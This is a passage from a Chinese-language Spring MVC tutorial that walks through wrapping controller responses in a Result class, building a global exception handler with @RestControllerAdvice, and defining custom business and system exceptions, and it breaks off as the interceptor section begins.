20020;    public static final Integer UPDATE_ERR &#x3D; 20030;    public static final Integer GET_ERR &#x3D; 20040;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>修改原来的控制类，将每个结果封装成 Result 类</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Book</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/books"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">BookService</span> bookService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@PostMapping</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Book</span> book<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> flag <span class="token operator">=</span> bookService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span>flag<span class="token operator">?</span><span class="token class-name">Code</span><span class="token punctuation">.</span>SAVE_OK<span class="token operator">:</span><span class="token class-name">Code</span><span class="token punctuation">.</span>SAVE_ERR<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PutMapping</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Book</span> book<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> flag <span class="token operator">=</span> bookService<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span>flag<span class="token operator">?</span><span class="token class-name">Code</span><span class="token punctuation">.</span>UPDATE_OK<span class="token operator">:</span><span class="token class-name">Code</span><span class="token punctuation">.</span>UPDATE_ERR<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@DeleteMapping</span><span class="token punctuation">(</span><span class="token string">"/&#123;id&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> flag <span class="token operator">=</span> bookService<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span>flag<span class="token operator">?</span><span class="token class-name">Code</span><span class="token punctuation">.</span>DELETE_OK<span class="token operator">:</span><span class="token class-name">Code</span><span class="token punctuation">.</span>DELETE_ERR<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/&#123;id&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">getById</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Book</span> book <span class="token operator">=</span> bookService<span class="token punctuation">.</span><span class="token function">getById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> code <span class="token operator">=</span> book <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span><span class="token class-name">Code</span><span class="token punctuation">.</span>GET_OK <span class="token operator">:</span> <span class="token class-name">Code</span><span class="token punctuation">.</span>GET_ERR<span class="token punctuation">;</span>        <span class="token class-name">String</span> msg <span class="token operator">=</span> book <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">""</span><span class="token operator">:</span><span class="token string">"数据查询失败，请重试"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span>book<span class="token punctuation">,</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@GetMapping</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">></span></span> books <span class="token operator">=</span> bookService<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> code <span class="token operator">=</span> books <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token operator">?</span><span class="token class-name">Code</span><span class="token punctuation">.</span>GET_OK <span class="token operator">:</span> <span class="token class-name">Code</span><span class="token punctuation">.</span>GET_ERR<span class="token punctuation">;</span>        <span class="token class-name">String</span> msg <span class="token operator">=</span> books <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> <span class="token string">"数据查询失败，请重试"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span>books<span class="token punctuation">,</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="19-异常处理器"><a class="markdownIt-Anchor" href="#19-异常处理器">#</a> 19、异常处理器</h1><ul><li>程序开发过程中不可避免的会遇到异常现象</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221006153643598.png" alt="image-20221006153643598"></p><ul><li>出现异常现象的常见位置与常见诱因如下<ul><li>框架内部抛出的异常：因使用不合规导致</li><li>数据层抛出的异常：因外部服务器故障导致（例如：服务器访问超时）</li><li>业务层抛出的异常：因业务逻辑书写错误导致（例如：遍历业务书写操作，导致索引异常等）</li><li>表现层抛出的异常：因数据收集、校验等规则导致（例如：不匹配的数据类型间导致异常）</li><li>工具类抛出的异常：因工具类书写不严谨不够健壮导致（例如：必要释放的连接长期未释放等）</li></ul></li></ul><ol><li>各层级均出现异常，异常处理代码书写在哪一层？—— 所有的异常均抛出到表现层进行处理</li><li>表现层处理异常，每个方法中单独书写，代码书写量巨大且意义不强，如何解决 ——AOP 思想</li></ol><ul><li>异常处理器：<ul><li>集中的、统一的处理项目中出现的异常</li></ul></li></ul><hr><ul><li>在 controller 包下新建异常处理类 ProjectExceptionAdvice，原 controller 类代码不变</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ExceptionHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestControllerAdvice</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestControllerAdvice</span><span class="token comment">//声明这个类是做异常处理的，SpringMVC配置要扫描到所在的包</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProjectExceptionAdvice</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//定义处理异常的方法</span>    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">Exception</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token comment">//注解声明负责处理哪种异常</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">doException</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"嘿嘿 异常你哪里跑"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">"嘿嘿 异常你哪里跑"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：如果要在别的包下建异常处理器，需要在 SpringMvcConfig 中添加这个包的路径</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221006154740850.png" alt="image-20221006154740850"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221006154756928.png" alt="image-20221006154756928"></p><ul><li><p>注解：</p><ul><li><p>名称：@RestControllerAdvice</p></li><li><p>类型：类注解</p></li><li><p>位置：Rest 风格开发的控制器增强类定义上方</p></li><li><p>作用：为 Rest 风格开发的控制器类做增强</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestControllerAdvice</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProjectExceptionAdvice</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>说明：此注解自带 @ResponseBody 注解与 @Component 注解，具备对应功能</p></li></ul></li><li><p>注解：</p><ul><li><p>名称：@ExceptionHandler</p></li><li><p>类型：方法注解</p></li><li><p>位置：专用于一行处理的控制器方法上方</p></li><li><p>作用：设置指定异常的处理方案，功能等同于控制器方法，出现异常后终止原始控制器执行，并转入当前方法执行</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">Exception</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">doException</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"嘿嘿 异常你哪里跑"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">"嘿嘿 异常你哪里跑"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>说明：此类方法可以根据处理的异常不同，制作多个方法分别处理对应的异常</p></li></ul></li></ul><h1 id="20-项目异常处理"><a class="markdownIt-Anchor" href="#20-项目异常处理">#</a> 20、项目异常处理</h1><ul><li>项目异常分类<ul><li>业务异常（BusinessException）<ul><li>不规范的用户行为操作产生的异常</li><li>规范的用户行为产生异常</li><li>处理：发送对应消息传递给用户，提醒规范操作</li></ul></li><li>系统异常（SystemException）<ul><li>项目运行中可预计且无法避免的异常</li><li>处理：<ul><li>发送固定消息传递给用户，安抚用户</li><li>发送特定消息给运维人员，提醒维护</li><li>记录日志</li></ul></li></ul></li><li>其他异常（Exception）<ul><li>编程人员未预期到的异常</li><li>处理：<ul><li>发送固定消息传递给用户，安服用户</li><li>发送特定消息给编程人员，提醒维护（纳入预期范围内）</li><li>记录日志</li></ul></li></ul></li></ul></li></ul><p>自定义系统级异常自定义项目业务级异常自定义异常编码（持续补充）触发自定义异常拦截并处理异常</p><hr><p>实现过程：</p><ul><li>新建 exception 包，定义 BusinessException 类和 SystemException 类，继承 RuntimeException 接口，提供 code 值和多个构造方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>exception</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BusinessException</span> <span class="token keyword">extends</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> code<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCode</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">BusinessException</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">,</span> <span class="token class-name">String</span> message<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">BusinessException</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">,</span> <span class="token class-name">String</span> message<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> cause<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> cause<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>exception</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SystemException</span> <span class="token keyword">extends</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> code<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCode</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">SystemException</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">,</span> <span class="token class-name">String</span> message<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">SystemException</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">,</span> <span class="token class-name">String</span> message<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> cause<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> cause<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在 code 类中完善异常的值</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Code</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//系统级异常</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Integer</span> SYSTEM_ERR <span class="token operator">=</span> <span class="token number">50001</span><span class="token punctuation">;</span>    <span class="token comment">//系统超时异常</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Integer</span> SYSTEM_TIMEOUT_ERR <span class="token operator">=</span> <span class="token number">50002</span><span class="token punctuation">;</span>    <span class="token comment">//业务级异常</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Integer</span> BUSINESS_ERR <span class="token operator">=</span> <span class="token number">60002</span><span class="token punctuation">;</span>    <span class="token comment">//其他异常</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Integer</span> SYSTEM_UNKNOWN_CODE <span class="token operator">=</span> <span class="token number">59999</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在 ProjectExceptionAdvice 类中写处理响应异常方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>exception<span class="token punctuation">.</span></span><span class="token class-name">BusinessException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>exception<span class="token punctuation">.</span></span><span class="token class-name">SystemException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ExceptionHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestControllerAdvice</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestControllerAdvice</span><span class="token comment">//声明这个类是做异常处理的，SpringMVC配置要扫描到所在的包</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProjectExceptionAdvice</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//定义处理异常的方法</span>    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">Exception</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token comment">//注解声明负责处理哪种异常</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">doException</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//记录日志</span>        <span class="token comment">//发送消息给运维</span>        <span class="token comment">//发送右键给开发人员</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"嘿嘿 异常你哪里跑"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">"嘿嘿 异常你哪里跑"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">SystemException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token comment">//注解抓取处理哪种异常</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">doSystemException</span><span class="token punctuation">(</span><span class="token class-name">SystemException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//记录日志</span>        <span class="token comment">//发送消息给运维</span>        <span class="token comment">//发送右键给开发人员</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span>ex<span class="token punctuation">.</span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span>ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">BusinessException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">doBusinessException</span><span class="token punctuation">(</span><span class="token class-name">BusinessException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token class-name">Code</span><span class="token punctuation">.</span>SYSTEM_UNKNOWN_CODE<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">"系统繁忙，请稍后再试"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在业务层的类中抛出异常</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Book</span> <span class="token function">getById</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>id<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BusinessException</span><span class="token punctuation">(</span><span class="token class-name">Code</span><span class="token punctuation">.</span>BUSINESS_ERR<span class="token punctuation">,</span><span class="token string">"请不要使用你的技术挑战我的耐性"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//将可能出现的异常进行包装，转换成自定义异常</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SystemException</span><span class="token punctuation">(</span><span class="token class-name">Code</span><span class="token punctuation">.</span>SYSTEM_TIMEOUT_ERR<span class="token punctuation">,</span><span class="token string">"服务器访问超时，请重试"</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> bookDao<span class="token punctuation">.</span><span class="token function">getById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="21-拦截器"><a class="markdownIt-Anchor" href="#21-拦截器">#</a> 21、拦截器</h1><h2 id="211-拦截器概念"><a class="markdownIt-Anchor" href="#211-拦截器概念">#</a> 21.1 拦截器概念</h2><ul><li>拦截器（Interceptor）是一种动态拦截方法调用的机制，在 SpringMVC 中动态拦截控制器方法执行</li><li>作用：<ul><li>在指定的方法调用前后执行预先设定的代码</li><li>阻止原始方法的执行</li></ul></li></ul><h2 id="212-拦截器与过滤器区别"><a class="markdownIt-Anchor" href="#212-拦截器与过滤器区别">#</a> 21.2 拦截器与过滤器区别</h2><ul><li>归属不同：Filter 属于 Servlet 技术，Interceptor 属于 SpringMVC 技术</li><li>拦截内容不同：Filter 对所有访问进行增强，Interceptor 仅针对 SpringMVC 的访问进行增强</li></ul><h2 id="213-拦截器入门案例"><a class="markdownIt-Anchor" href="#213-拦截器入门案例">#</a> 21.3 拦截器入门案例</h2><ol><li><p>制作拦截器功能类，并实现 HandlerInterceptor 接口（注意：扫描加载 bean）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>interceptor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token 